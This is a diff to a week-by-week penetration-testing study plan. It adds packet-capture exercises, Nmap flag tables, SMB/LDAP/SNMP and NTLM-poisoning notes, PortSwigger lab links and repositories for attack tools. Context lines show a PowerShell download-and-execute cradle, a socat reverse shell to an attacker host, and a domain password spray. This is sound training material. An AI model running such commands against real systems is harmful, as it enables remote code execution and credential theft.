@@ -51,7 +51,7 @@ pip3 install impacket
 
 ### Theory
 - Nmap official book (free): https://nmap.org/book/
-  - Focus: Chapter 9 (NSE scripting), Chapter 5 (OS detection), Chapter 6 (port scanning)
+  - Focus: Chapter 5 (port scanning techniques & algorithms), Chapter 7 (service/version detection), Chapter 8 (OS detection), Chapter 9 (NSE scripting)
 - HackTricks Network Services: https://book.hacktricks.xyz/network-services-pentesting
   - Read every service entry (FTP, SMB, SMTP, SNMP, LDAP, RPC)
 - Nmap NSE script categories: `ls /usr/share/nmap/scripts/ | grep -E "vuln|exploit|brute"`
@@ -87,6 +87,44 @@ nmap -sn <CIDR>                                          # host discovery only
 ```
 
 **IppSec Reference:** [Kioptrix 1 walkthrough — SMB enumeration methodology](https://www.youtube.com/c/ippsec)
+
+### Packet Analysis Challenge
+
+Capture your own Nmap scans with Wireshark or tcpdump and observe TCP flags at the wire level. This is essential for understanding what a target (or IDS) sees when you scan.
+
+```bash
+# Capture traffic to/from target while running Nmap
+sudo tcpdump -i eth0 host <TARGET> -w /tmp/week1_scan.pcap
+
+# Open interactively in Wireshark:
+wireshark /tmp/week1_scan.pcap &
+
+# Or inspect quickly in terminal:
+tcpdump -r /tmp/week1_scan.pcap -nn -q | head -50
+```
+
+**TCP flag behaviour per scan type:**
+
+| Scan | Nmap Flag | Probe Packet | Open Port | Closed Port | Filtered |
+|------|-----------|--------------|-----------|-------------|----------|
+| SYN Stealth | `-sS` | `SYN` | `SYN/ACK` → attacker replies `RST` | `RST/ACK` | No reply or ICMP unreachable |
+| TCP Connect | `-sT` | Full handshake: `SYN` → `SYN/ACK` → `ACK` | Normal 3-way handshake then `RST` | `RST/ACK` | No reply or ICMP unreachable |
+| ACK | `-sA` | `ACK` | `RST` (unfiltered — stateless firewall) | `RST` | No reply (stateful firewall drops it) |
+| NULL | `-sN` | No flags (all zero) | No reply | `RST/ACK` | No reply |
+| FIN | `-sF` | `FIN` | No reply | `RST/ACK` | No reply |
+| Xmas | `-sX` | `FIN + PSH + URG` | No reply | `RST/ACK` | No reply |
+| UDP | `-sU` | UDP datagram | No reply or app reply | ICMP type 3 / code 3 (port unreachable) | ICMP type 3 / code 1,2,9,10,13 |
+
+**Essential Wireshark display filters:**
+```
+tcp.flags.syn == 1 && tcp.flags.ack == 0      # all SYN probes (scan traffic)
+tcp.flags.reset == 1                           # all RST responses (closed/rejected ports)
+icmp.type == 3                                 # ICMP port unreachable (filtered ports/UDP)
+tcp.analysis.retransmission                    # dropped packets → filtered ports
+ip.src == <TARGET> && tcp.flags.syn == 1 && tcp.flags.ack == 1   # SYN/ACK responses (open TCP)
+```
+
+**Key insight:** A SYN scan (`-sS`) is historically called "stealthy" because the attacker never completes the three-way handshake — older application-level logging only recorded completed connections. Modern IDS/SIEM solutions and stateful firewalls log SYN packets regardless, so `-sS` is stealthy relative to `-sT` only in legacy environments. A full connect scan (`-sT`) always appears in server logs as a normal connection attempt.
 
 ---
 
@@ -137,12 +175,52 @@ nbtscan -r <CIDR>
 
 **IppSec Reference:** Search "ippsec smb enumeration" or "ippsec enum4linux" on YouTube
 
+### Packet Analysis Challenge
+
+Capture protocol traffic during enumeration and inspect it at the wire level. The ability to read raw packets separates methodology from tooling dependency.
+
+```bash
+# Capture SMB, LDAP, and SNMP traffic simultaneously
+sudo tcpdump -i eth0 host <TARGET> and \( port 445 or port 389 or port 161 \) -w /tmp/week2_protos.pcap
+
+# Quick terminal review (no GUI)
+tcpdump -r /tmp/week2_protos.pcap -nn -A | less
+
+# Decode SNMP community strings directly from pcap
+tcpdump -r /tmp/week2_protos.pcap -nn -v port 161 | grep -i "community"
+```
+
+**SMB Handshake — TCP 445 (`smb2` or `smb` Wireshark filter):**
+- `NEGOTIATE Protocol Request` → client advertises supported SMB dialects (SMBv1/2/3)
+- `NEGOTIATE Protocol Response` → server selects dialect; note: if SMBv1 is accepted, MS17-010 may apply
+- `SESSION_SETUP Request` → NTLM `NEGOTIATE` token embedded; server replies with `CHALLENGE` token
+- Look for `NTLMSSP_NEGOTIATE` followed by `NTLMSSP_CHALLENGE` — the challenge blob is what Responder poisons to capture crackable NTLMv2 hashes
+- Wireshark filter: `ntlmssp` to isolate all NTLM authentication frames
+
+**LDAP Traffic — TCP/UDP 389 (`ldap` Wireshark filter):**
+- `bindRequest` with empty credentials → unauthenticated bind attempt; success means the server allows anonymous enumeration
+- `bindRequest` with `authType: simple` → **plaintext credentials** sent on the wire (no TLS); always flag in a report
+- `searchRequest` frames reveal the base DN (`DC=domain,DC=local`) and what attributes are queried (`sAMAccountName`, `memberOf`, `userPrincipalName`)
+- Wireshark filter: `ldap.messageID` to follow a complete request/response exchange
+
+**SNMP — UDP 161 (`snmp` Wireshark filter):**
+- Community strings are **plaintext** in SNMPv1 and SNMPv2c — visible in the `community` field of every PDU
+- `GetRequest` / `GetNextRequest` / `GetBulkRequest` → your enumeration queries; responses contain raw OID values
+- A `GetResponse` to OID `1.3.6.1.2.1.25.4.2.1.2` returns the running process list; `1.3.6.1.2.1.25.6.3.1.2` returns installed software
+- Wireshark filter: `snmp.community == "public"` to find default community strings
+
+**LLMNR/NBT-NS poisoning — Wireshark filters for Responder analysis:**
+```
+llmnr          # Link-Local Multicast Name Resolution requests (poisonable)
+nbns           # NetBIOS Name Service broadcasts (poisonable)
+ntlmssp        # Captures the NTLM exchange after poisoning — shows NTLMv2 hash material
+```
+
 ---
 
 ## Week 3 — Web Hacking: Server-Side Injection Fundamentals
 
 ### Theory
-- PortSwigger Web Security Academy (100% free): https://portswigger.net/web-security
   - SQL injection: all apprentice + practitioner labs
   - Path traversal: all apprentice + practitioner labs
   - OS command injection: all apprentice + practitioner labs
@@ -152,16 +230,16 @@ nbtscan -r <CIDR>
 ### Action
 **PortSwigger Free Labs (no subscription required):**
 - SQL injection:
-  - `SQL injection vulnerability in WHERE clause allowing retrieval of hidden data`
-  - `SQL injection UNION attack, determining the number of columns`
-  - `SQL injection UNION attack, retrieving data from other tables`
-  - `SQL injection attack, querying the database type and version on MySQL and Microsoft`
-  - `Blind SQL injection with conditional responses`
-  - `Blind SQL injection with time delays and information retrieval`
+  - [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+  - [SQL injection UNION attack, determining the number of columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
+  - [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
+  - [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
+  - [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
+  - [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
 - OS command injection:
-  - `OS command injection, simple case`
-  - `Blind OS command injection with time delays`
-  - `Blind OS command injection with out-of-band data exfiltration`
+  - [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
+  - [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+  - [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
 
 **VulnHub Machine:**
 - **bWAPP** — isolated web app lab, enable SQLi and command injection modules
@@ -223,18 +301,18 @@ curl -v -X POST "http://<TARGET>/login" \
 ### Action
 **PortSwigger Free Labs:**
 - SSRF:
-  - `Basic SSRF against the local server`
-  - `Basic SSRF against another back-end system`
-  - `SSRF with blacklist-based input filter`
-  - `SSRF via the Referer header`
+  - [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
+  - [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
+  - [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+  - [SSRF via the Referer header](https://portswigger.net/web-security/ssrf/lab-ssrf-via-referer-header)
 - XXE:
-  - `Exploiting XXE using external entities to retrieve files`
-  - `Exploiting XXE to perform SSRF attacks`
-  - `Blind XXE with out-of-band interaction`
+  - [Exploiting XXE using external entities to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
+  - [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
+  - [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
 - File Upload:
-  - `Remote code execution via web shell upload`
-  - `Web shell upload via Content-Type restriction bypass`
-  - `Web shell upload via path traversal`
+  - [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
+  - [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
+  - [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
 
 **VulnHub Machine:**
 - **Typhoon v1.02** — multiple web vulnerabilities including file upload
@@ -299,21 +377,21 @@ python3 -m http.server 8080
 ### Action
 **PortSwigger Free Labs:**
 - Authentication:
-  - `Username enumeration via different responses`
-  - `2FA simple bypass`
-  - `Password reset broken logic`
-  - `Username enumeration via response timing`
-  - `Broken brute-force protection, IP block`
+  - [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
+  - [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
+  - [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
+  - [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
+  - [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
 - Access Control:
-  - `Unprotected admin functionality`
-  - `User role controlled by request parameter`
-  - `User ID controlled by request parameter`
-  - `URL-based access control can be circumvented`
-  - `Method-based access control can be circumvented`
+  - [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)
+  - [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
+  - [User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)
+  - [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
+  - [Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
 - Deserialization:
-  - `Modifying serialized objects`
-  - `Modifying serialized data types`
-  - `Using application functionality to exploit insecure deserialization`
+  - [Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
+  - [Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
+  - [Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
 
 **VulnHub Machine:**
 - **DVWA (Damn Vulnerable Web Application)** — authentication bypass + CSRF modules
@@ -367,13 +445,13 @@ gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raf
 ### Action
 **PortSwigger Free Labs:**
 - SSTI:
-  - `Basic server-side template injection`
-  - `Basic server-side template injection (code context)`
-  - `Server-side template injection using documentation`
-  - `Server-side template injection in an unknown language with a documented exploit`
+  - [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
+  - [Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
+  - [Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
+  - [Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 - Request Smuggling:
-  - `HTTP request smuggling, basic CL.TE vulnerability`
-  - `HTTP request smuggling, basic TE.CL vulnerability`
+  - [HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
+  - [HTTP request smuggling, basic TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
 
 **VulnHub Machine:**
 - **FluxCapacitor** — SSTI and filter bypass challenge
@@ -598,6 +676,12 @@ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<
 - HackTricks Active Directory: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
 - PayloadsAllTheThings AD: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
 - Kerberos in depth: https://web.mit.edu/kerberos/krb5-latest/doc/
+- **Tool repos:**
+  - Impacket: https://github.com/fortra/impacket
+  - BloodHound CE: https://github.com/SpecterOps/BloodHound
+  - Responder: https://github.com/lgandx/Responder
+  - CrackMapExec / NetExec: https://github.com/Pennyw0rth/NetExec
+  - evil-winrm: https://github.com/Hackplayers/evil-winrm
 
 ### Action
 **VulnHub Machines:**
@@ -661,6 +745,9 @@ crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --no-bruteforce
 - DCSync attack: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync
 - Golden/Silver Ticket: https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets
 - ACL-based attacks: https://www.thehacker.recipes/ad/movement/dacl
+- **Tunneling/pivoting tool repos:**
+  - Chisel (TCP/UDP tunnel over HTTP): https://github.com/jpillora/chisel
+  - Ligolo-ng (reverse tunnel via TUN interface): https://github.com/nicocha30/ligolo-ng
 
 ### Action
 **VulnHub / HTB Machines (free tier):**
@@ -789,7 +876,7 @@ socat TCP:<ATTACKER>:4444 EXEC:'cmd.exe',pipes
 ### Theory
 - Aleph One "Smashing the Stack for Fun and Profit" (free, Phrack #49): http://phrack.org/issues/49/14.html
 - LiveOverflow Binary Exploitation playlist (free YouTube): https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
-- GDB PEDA/pwndbg cheatsheet: https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md
+- GDB PEDA/pwndbg repository: https://github.com/pwndbg/pwndbg
 - x86 Assembly reference: https://www.cs.virginia.edu/~evans/cs216/guides/x86.html
 
 ### Action
